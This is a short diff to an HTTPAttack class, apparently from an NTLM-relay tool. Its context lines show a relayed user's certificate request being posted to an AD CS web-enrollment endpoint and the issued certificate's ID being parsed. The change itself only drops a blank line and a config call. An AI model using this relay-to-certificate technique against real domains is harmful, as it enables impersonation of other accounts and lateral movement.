@@ -49,7 +49,6 @@ class HTTPAttack(ProtocolAttack):
         csr = self.generate_csr(key, self.username)
         csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
         logging.info("CSR generated!")
-
         data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, self.config.template)
 
         headers = {
@@ -71,7 +70,6 @@ class HTTPAttack(ProtocolAttack):
         found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
         if len(found) == 0:
             logging.error("Error obtaining certificate!")
-            config.set_pki(True)
             return
 
         certificate_id = found[0]
